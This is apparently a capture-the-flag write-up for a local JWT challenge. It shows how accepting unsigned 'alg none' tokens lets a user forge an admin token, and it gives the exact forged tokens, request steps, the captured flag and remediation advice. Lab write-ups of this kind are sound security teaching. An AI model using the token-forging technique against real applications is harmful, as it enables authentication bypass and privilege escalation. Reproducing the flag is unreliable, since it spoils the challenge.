## TL;DR
- Objective: Exploit unsigned JWT vulnerability to escalate privileges and retrieve flag
- Outcome: ACHIEVED - Successfully escalated from user to admin role and captured flag
- Highest-impact finding: JWT "none" algorithm vulnerability allowing trivial token forgery and privilege escalation
- Validation status: Confirmed - Flag retrieved via forged admin JWT

## Target Information
- Target: 127.0.0.1:32995
- Host / base URL: http://127.0.0.1:32995
- Application or component: JWT Manipulation Challenge
- Authentication context: JWT-based session management via HTTP cookies
- Relevant technology details: Application uses JWT with "alg":"none" (unsigned tokens)

## Confirmed Vulnerability
### JWT None Algorithm Vulnerability
- Affected endpoint / component: /profile, /gettheflag (JWT validation across application)
- Impact: Complete authentication bypass and privilege escalation - any user can forge admin tokens
- Preconditions: Valid user account (credentials provided: user:user)
- Exact payload or PoC:

**Original JWT (user role):**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.
```

**Forged Admin JWT:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.
```

## Steps to Reproduce
1. Navigate to http://127.0.0.1:32995/login and authenticate with credentials `user:user`
2. Observe the Set-Cookie header containing a JWT token with `"alg":"none"` and `"role":"user"`
3. Decode the JWT payload and modify the `role` field from `"user"` to `"admin"`
4. Re-encode the payload using base64url encoding (no signature required due to "none" algorithm)
5. Construct forged token: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.`
6. Set the forged token as the session cookie (e.g., `token=<forged_token>`)
7. Visit http://127.0.0.1:32995/profile to verify admin status is recognized
8. Visit http://127.0.0.1:32995/gettheflag to retrieve the hidden flag

## Validation / Evidence
- Validation token / flag: `FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}`

- Tool evidence:
```
Response from /gettheflag with forged admin token:
HTTP/1.1 200 OK
content-type: text/html; charset=utf-8
content-length: 70

FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}
```

- Request evidence:
```
GET /gettheflag HTTP/1.1
Host: 127.0.0.1:32995
Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.
```

- Response evidence: HTTP 200 OK response containing the flag proves successful privilege escalation
- Notes on reliability / limitations: 100% reliable - the "none" algorithm completely disables signature verification

## Remediation
- Root cause: The application accepts JWT tokens with `"alg":"none"` and does not verify signatures. This allows attackers to forge arbitrary tokens by simply modifying the payload and re-encoding.

- Recommended fix:
  1. **Explicitly reject "none" algorithm**: Configure JWT library to explicitly reject tokens with `alg: none`
  2. **Use secure algorithm**: Enforce HMAC (HS256) or RSA (RS256) with a strong secret key
  3. **Verify signatures**: Ensure the application always verifies JWT signatures against the configured secret/key
  4. **Whitelist algorithms**: Configure the JWT library with an explicit whitelist of allowed algorithms

- Defense-in-depth:
  1. Implement server-side session validation independent of JWT claims
  2. Use short token expiration times to limit window of abuse
  3. Maintain an allowlist of valid tokens and check against it
  4. Log and alert on authentication anomalies including role changes

## How to Verify the Fix
1. Attempt to access `/gettheflag` with the forged admin token `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.`
2. **Expected secure result**: The application should reject the token with HTTP 401 or 403, or redirect to login. The response should NOT contain the flag.
3. Verify that valid JWTs signed with the proper algorithm (e.g., HS256) are accepted
4. Verify that tokens with modified payloads fail signature verification

## Remaining Leads
- Confirmed blockers: None
- Unverified leads: None
- Missing context: None

---

## Technical Appendix

### JWT Structure Analysis

**Header (decoded):**
```json
{"alg":"none","typ":"JWT"}
```

**Original Payload (decoded):**
```json
{"username":"user","role":"user"}
```

**Forged Admin Payload (decoded):**
```json
{"username":"user","role":"admin"}
```

**Base64 Encoded Components:**
- Header: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
- Admin Payload: `eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ`
- Signature: Empty (none algorithm)

### Affected Endpoints
1. `/login` (POST) - Returns JWT cookie upon authentication
2. `/profile` (GET) - Displays user profile, reveals admin-only content when accessed with admin token
3. `/gettheflag` (GET) - Admin-only endpoint returning the challenge flag
